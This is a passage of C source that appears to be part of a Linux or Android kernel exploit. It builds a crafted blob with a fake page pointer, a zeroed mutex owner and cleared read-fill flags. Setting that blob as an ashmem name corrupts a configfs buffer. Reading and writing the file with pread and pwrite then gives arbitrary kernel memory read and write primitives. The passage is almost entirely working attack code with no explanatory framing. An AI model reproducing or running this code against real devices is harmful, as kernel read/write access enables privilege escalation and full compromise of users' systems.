  off_t off = target & 0xFFFFFF;
  // put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  // put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);

  // /* read_in_progress at blob[73] = 0; write_in_progress at blob[74] = 0 */
  // blob[CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN + 4] = 0;
  // blob[CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN + 5] = 0;
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, off);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0x41, sizeof(blob));  /* fill non-zero: avoids zero-truncation in try_set_ashmem_name_blob */
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  /* mutex.owner at blob[21..28] must be 0 for mutex_lock fast path */
  memset(blob + 21, 0, 8);
  /* needs_read_fill at blob[69..72] = 0 → skip fill_read_buffer */
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  /* read_in_progress at blob[73] = 0 */
  blob[CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN + 4] = 0;
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
